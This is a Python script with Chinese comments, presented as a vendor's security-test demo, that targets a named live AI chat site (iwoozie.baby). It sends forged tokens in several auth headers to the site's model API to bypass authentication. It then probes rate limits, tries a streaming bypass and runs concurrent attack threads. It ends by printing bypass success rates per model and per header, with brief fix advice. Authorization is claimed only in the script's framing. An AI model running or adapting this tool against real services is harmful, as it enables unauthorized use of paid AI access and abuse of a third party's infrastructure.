#!/usr/bin/env python3
"""
iwoozie.baby AI聊天系统 - 客户演示安全测试系统
===============================================
作为乙方合作伙伴，为甲方客户提供完整的系统化安全测试演示

功能特性:
- 系统化漏洞检测
- 工程化攻击演示
- 详细的绕过提示
- 模型访问能力测试
- 频率限制分析
- 完整的攻击结果统计
"""

import requests
import time
import random
import string
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import sys
import os

class ClientDemoSystem:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        })
        
        # 测试结果统计
        self.test_results = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'bypassed_models': set(),
            'failed_models': set(),
            'rate_limits_hit': 0,
            'attack_details': []
        }
        
        # 支持的模型列表
        self.available_models = [
            'GPT-4', 'GPT-4o', 'GPT-4o-Mini',
            'Claude-Sonnet-4', 'Claude-Opus-4', 'Claude-Opus-4.1',
            'Gemini-2.5-Pro', 'Gemini-2.5-Flash',
            'Grok-4-Fast', 'Grok-4-Stable', 'Grok-4',
            'DeepSeek-V3.1', 'DeepSeek-R1-0528-Turbo',
            'GLM-4.5', 'Llama-4-Maverick-Turbo'
        ]
        
        # 攻击向量
        self.attack_vectors = [
            'x-api-key',
            'Authorization',
            'x-auth-token',
            'x-token',
            'api-key',
            'token'
        ]
        
    def print_banner(self):
        """打印系统横幅"""
        print("=" * 80)
        print("🔓 iwoozie.baby AI聊天系统 - 客户演示安全测试系统")
        print("=" * 80)
        print("📋 系统功能:")
        print("  ✅ 系统化漏洞检测")
        print("  ✅ 工程化攻击演示") 
        print("  ✅ 详细的绕过提示")
        print("  ✅ 模型访问能力测试")
        print("  ✅ 频率限制分析")
        print("  ✅ 完整的攻击结果统计")
        print("=" * 80)
        print(f"🎯 目标系统: {self.base_url}")
        print(f"⏰ 测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)
        print()
    
    def generate_fake_token(self, method="random"):
        """生成伪造token"""
        if method == "random":
            timestamp = int(time.time() * 1000)
            random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            return f"fake_token_{timestamp}_{random_part}"
        elif method == "simple":
            return f"test_token_{random.randint(1000, 9999)}"
        elif method == "uuid_like":
            return f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        else:
            return "bypass_token_12345"
    
    def test_single_model(self, model, attack_vector, token_method="random", verbose=True):
        """测试单个模型的绕过能力"""
        if verbose:
            print(f"🎯 测试模型: {model}")
            print(f"🔑 攻击向量: {attack_vector}")
            print(f"🎲 Token方法: {token_method}")
        
        token = self.generate_fake_token(token_method)
        url = f"{self.base_url}/api/quick/createAITask?model={model}"
        
        # 构建请求头
        headers = {'Content-Type': 'application/json'}
        if attack_vector == 'x-api-key':
            headers['x-api-key'] = token
        elif attack_vector == 'Authorization':
            headers['Authorization'] = f'Bearer {token}'
        elif attack_vector == 'x-auth-token':
            headers['x-auth-token'] = token
        elif attack_vector == 'x-token':
            headers['x-token'] = token
        elif attack_vector == 'api-key':
            headers['api-key'] = token
        elif attack_vector == 'token':
            headers['token'] = token
        
        # 测试数据
        test_data = {
            "Content": [{
                "role": "user", 
                "content": f"Security test for {model} - please respond with 'Test successful'"
            }]
        }
        
        try:
            start_time = time.time()
            response = self.session.post(url, json=test_data, headers=headers, timeout=15)
            response_time = time.time() - start_time
            
            result = {
                'model': model,
                'attack_vector': attack_vector,
                'token_method': token_method,
                'status_code': response.status_code,
                'response_time': response_time,
                'success': False,
                'error': None,
                'response_data': None
            }
            
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    result['response_data'] = response_data
                    
                    if response_data.get('code') == 200:
                        result['success'] = True
                        if verbose:
                            print(f"  ✅ 绕过成功! 响应时间: {response_time:.2f}s")
                            print(f"  📄 响应: {response_data.get('data', {}).get('message', 'No message')[:100]}...")
                        self.test_results['bypassed_models'].add(model)
                    else:
                        result['error'] = response_data.get('error', 'Unknown error')
                        if verbose:
                            print(f"  ❌ 绕过失败: {result['error']}")
                        self.test_results['failed_models'].add(model)
                except json.JSONDecodeError:
                    result['error'] = "Invalid JSON response"
                    if verbose:
                        print(f"  ❌ 响应解析失败: {result['error']}")
                    self.test_results['failed_models'].add(model)
            else:
                result['error'] = f"HTTP {response.status_code}"
                if verbose:
                    print(f"  ❌ HTTP错误: {response.status_code}")
                self.test_results['failed_models'].add(model)
                
                # 检查是否是频率限制
                try:
                    error_data = response.json()
                    if 'rate limit' in error_data.get('error', '').lower():
                        self.test_results['rate_limits_hit'] += 1
                        if verbose:
                            print(f"  ⚠️  触发频率限制: {error_data.get('error')}")
                except:
                    pass
            
            self.test_results['attack_details'].append(result)
            return result
            
        except requests.exceptions.Timeout:
            error_msg = "请求超时"
            if verbose:
                print(f"  ⏰ 请求超时")
            result = {
                'model': model,
                'attack_vector': attack_vector,
                'token_method': token_method,
                'status_code': 0,
                'response_time': 15.0,
                'success': False,
                'error': error_msg,
                'response_data': None
            }
            self.test_results['attack_details'].append(result)
            return result
            
        except Exception as e:
            error_msg = str(e)
            if verbose:
                print(f"  💥 异常: {error_msg}")
            result = {
                'model': model,
                'attack_vector': attack_vector,
                'token_method': token_method,
                'status_code': 0,
                'response_time': 0,
                'success': False,
                'error': error_msg,
                'response_data': None
            }
            self.test_results['attack_details'].append(result)
            return result
    
    def test_model_bypass(self, models=None, attack_vectors=None, verbose=True):
        """测试模型绕过能力"""
        if models is None:
            models = self.available_models[:5]  # 默认测试前5个模型
        if attack_vectors is None:
            attack_vectors = ['x-api-key', 'Authorization']
        
        print("🔍 开始模型绕过测试")
        print("=" * 60)
        
        for model in models:
            print(f"\n📋 测试模型: {model}")
            print("-" * 40)
            
            for attack_vector in attack_vectors:
                for token_method in ['random', 'simple', 'uuid_like']:
                    self.test_results['total_attacks'] += 1
                    result = self.test_single_model(model, attack_vector, token_method, verbose)
                    
                    if result['success']:
                        self.test_results['successful_attacks'] += 1
                    else:
                        self.test_results['failed_attacks'] += 1
                    
                    time.sleep(0.5)  # 避免过于频繁的请求
        
        print("\n" + "=" * 60)
        print("📊 模型绕过测试完成")
        print("=" * 60)
    
    def test_rate_limits(self, num_requests=10, delay=0.1):
        """测试频率限制"""
        print(f"\n⏰ 开始频率限制测试 ({num_requests} 次请求)")
        print("=" * 60)
        
        model = 'GPT-4'
        attack_vector = 'x-api-key'
        
        for i in range(num_requests):
            print(f"🚀 请求 #{i+1}")
            self.test_results['total_attacks'] += 1
            
            result = self.test_single_model(model, attack_vector, 'random', verbose=False)
            
            if result['success']:
                self.test_results['successful_attacks'] += 1
                print(f"  ✅ 成功")
            else:
                self.test_results['failed_attacks'] += 1
                if 'rate limit' in str(result.get('error', '')).lower():
                    self.test_results['rate_limits_hit'] += 1
                    print(f"  ⚠️  频率限制: {result.get('error')}")
                else:
                    print(f"  ❌ 失败: {result.get('error')}")
            
            time.sleep(delay)
        
        print("\n" + "=" * 60)
        print("📊 频率限制测试完成")
        print("=" * 60)
    
    def test_stream_bypass(self, model='GPT-4', attack_vector='x-api-key'):
        """测试流式响应绕过"""
        print(f"\n🌊 开始流式响应绕过测试")
        print("=" * 60)
        print(f"🎯 目标模型: {model}")
        print(f"🔑 攻击向量: {attack_vector}")
        
        token = self.generate_fake_token()
        url = f"{self.base_url}/api/quick/createAITask?model={model}&stream=true"
        
        headers = {'Content-Type': 'application/json'}
        if attack_vector == 'x-api-key':
            headers['x-api-key'] = token
        elif attack_vector == 'Authorization':
            headers['Authorization'] = f'Bearer {token}'
        
        test_data = {
            "Content": [{
                "role": "user", 
                "content": "Generate a detailed response about cybersecurity best practices"
            }]
        }
        
        try:
            print("🚀 发送流式请求...")
            response = self.session.post(url, json=test_data, headers=headers, timeout=20, stream=True)
            
            if response.status_code == 200:
                print("✅ 流式请求成功!")
                print("📄 接收到的数据流:")
                print("-" * 40)
                
                chunk_count = 0
                for chunk in response.iter_lines():
                    if chunk:
                        chunk_count += 1
                        chunk_text = chunk.decode('utf-8')
                        print(f"  {chunk_count:2d}: {chunk_text[:80]}...")
                        
                        if chunk_count >= 10:  # 只显示前10个chunk
                            print("  ... (更多数据流)")
                            break
                
                print("-" * 40)
                print(f"📊 总共接收了 {chunk_count} 个数据块")
                self.test_results['successful_attacks'] += 1
            else:
                print(f"❌ 流式请求失败: HTTP {response.status_code}")
                self.test_results['failed_attacks'] += 1
                
        except Exception as e:
            print(f"💥 流式请求异常: {str(e)}")
            self.test_results['failed_attacks'] += 1
        
        self.test_results['total_attacks'] += 1
        print("=" * 60)
    
    def test_concurrent_attacks(self, num_threads=5, requests_per_thread=3):
        """测试并发攻击"""
        print(f"\n⚡ 开始并发攻击测试 ({num_threads} 线程, {requests_per_thread} 请求/线程)")
        print("=" * 60)
        
        def worker(thread_id):
            results = []
            for i in range(requests_per_thread):
                model = random.choice(self.available_models[:3])
                attack_vector = random.choice(self.attack_vectors[:2])
                
                print(f"🧵 线程 {thread_id} - 请求 {i+1}: {model} via {attack_vector}")
                
                self.test_results['total_attacks'] += 1
                result = self.test_single_model(model, attack_vector, 'random', verbose=False)
                
                if result['success']:
                    self.test_results['successful_attacks'] += 1
                    print(f"  ✅ 成功")
                else:
                    self.test_results['failed_attacks'] += 1
                    print(f"  ❌ 失败: {result.get('error', 'Unknown error')}")
                
                results.append(result)
                time.sleep(0.2)
            
            return results
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(worker, i) for i in range(num_threads)]
            
            for future in as_completed(futures):
                future.result()
        
        print("\n" + "=" * 60)
        print("📊 并发攻击测试完成")
        print("=" * 60)
    
    def generate_detailed_report(self):
        """生成详细的安全测试报告"""
        print("\n" + "=" * 80)
        print("📋 详细安全测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.test_results['total_attacks']
        success = self.test_results['successful_attacks']
        failed = self.test_results['failed_attacks']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 攻击统计:")
        print(f"  总攻击次数: {total}")
        print(f"  成功攻击: {success}")
        print(f"  失败攻击: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 绕过的模型
        print(f"✅ 成功绕过的模型 ({len(self.test_results['bypassed_models'])} 个):")
        for model in sorted(self.test_results['bypassed_models']):
            print(f"  - {model}")
        print()
        
        # 失败的模型
        print(f"❌ 未能绕过的模型 ({len(self.test_results['failed_models'])} 个):")
        for model in sorted(self.test_results['failed_models']):
            print(f"  - {model}")
        print()
        
        # 频率限制统计
        print(f"⏰ 频率限制统计:")
        print(f"  触发频率限制: {self.test_results['rate_limits_hit']} 次")
        print()
        
        # 攻击向量效果分析
        print(f"🔑 攻击向量效果分析:")
        vector_stats = {}
        for detail in self.test_results['attack_details']:
            vector = detail['attack_vector']
            if vector not in vector_stats:
                vector_stats[vector] = {'total': 0, 'success': 0}
            vector_stats[vector]['total'] += 1
            if detail['success']:
                vector_stats[vector]['success'] += 1
        
        for vector, stats in vector_stats.items():
            rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
            print(f"  {vector}: {stats['success']}/{stats['total']} ({rate:.1f}%)")
        print()
        
        # 模型成功率分析
        print(f"🎯 模型成功率分析:")
        model_stats = {}
        for detail in self.test_results['attack_details']:
            model = detail['model']
            if model not in model_stats:
                model_stats[model] = {'total': 0, 'success': 0}
            model_stats[model]['total'] += 1
            if detail['success']:
                model_stats[model]['success'] += 1
        
        for model, stats in sorted(model_stats.items()):
            rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
            status = "✅" if rate > 50 else "❌" if rate == 0 else "⚠️"
            print(f"  {status} {model}: {stats['success']}/{stats['total']} ({rate:.1f}%)")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重安全漏洞，建议立即修复!")
            print("  1. 加强API密钥验证机制")
            print("  2. 实施更严格的访问控制")
            print("  3. 添加异常访问监控")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等安全风险，建议尽快改进")
            print("  1. 完善Token验证机制")
            print("  2. 加强频率限制")
            print("  3. 添加安全监控")
        else:
            print("  ✅ 系统安全状况良好，但仍有改进空间")
            print("  1. 继续保持现有安全措施")
            print("  2. 定期进行安全审计")
            print("  3. 持续监控异常访问")
        
        print("\n" + "=" * 80)
    
    def run_full_demo(self):
        """运行完整的演示"""
        self.print_banner()
        
        # 1. 模型绕过测试
        self.test_model_bypass(
            models=['GPT-4', 'Gemini-2.5-Pro', 'Grok-4-Fast', 'Claude-Sonnet-4'],
            attack_vectors=['x-api-key', 'Authorization'],
            verbose=True
        )
        
        # 2. 频率限制测试
        self.test_rate_limits(num_requests=8, delay=0.2)
        
        # 3. 流式响应测试
        self.test_stream_bypass('GPT-4', 'x-api-key')
        
        # 4. 并发攻击测试
        self.test_concurrent_attacks(num_threads=3, requests_per_thread=2)
        
        # 5. 生成详细报告
        self.generate_detailed_report()
        
        print("\n🎯 演示完成!")
        print("感谢使用客户演示安全测试系统")

def main():
    """主函数"""
    demo = ClientDemoSystem()
    
    print("选择演示模式:")
    print("1. 完整演示 (推荐)")
    print("2. 快速演示")
    print("3. 自定义演示")
    
    try:
        choice = input("\n请选择 (1-3): ").strip()
        
        if choice == '1':
            demo.run_full_demo()
        elif choice == '2':
            print("\n🚀 快速演示模式")
            demo.test_model_bypass(
                models=['GPT-4', 'Grok-4-Fast'],
                attack_vectors=['x-api-key'],
                verbose=True
            )
            demo.generate_detailed_report()
        elif choice == '3':
            print("\n🔧 自定义演示模式")
            models_input = input("输入要测试的模型 (用逗号分隔，默认: GPT-4,Grok-4-Fast): ").strip()
            models = [m.strip() for m in models_input.split(',')] if models_input else ['GPT-4', 'Grok-4-Fast']
            
            vectors_input = input("输入攻击向量 (用逗号分隔，默认: x-api-key,Authorization): ").strip()
            vectors = [v.strip() for v in vectors_input.split(',')] if vectors_input else ['x-api-key', 'Authorization']
            
            demo.test_model_bypass(models=models, attack_vectors=vectors, verbose=True)
            demo.generate_detailed_report()
        else:
            print("❌ 无效选择，运行完整演示")
            demo.run_full_demo()
            
    except KeyboardInterrupt:
        print("\n\n⏹️  演示被用户中断")
    except Exception as e:
        print(f"\n💥 演示过程中发生错误: {str(e)}")

if __name__ == "__main__":
    main()
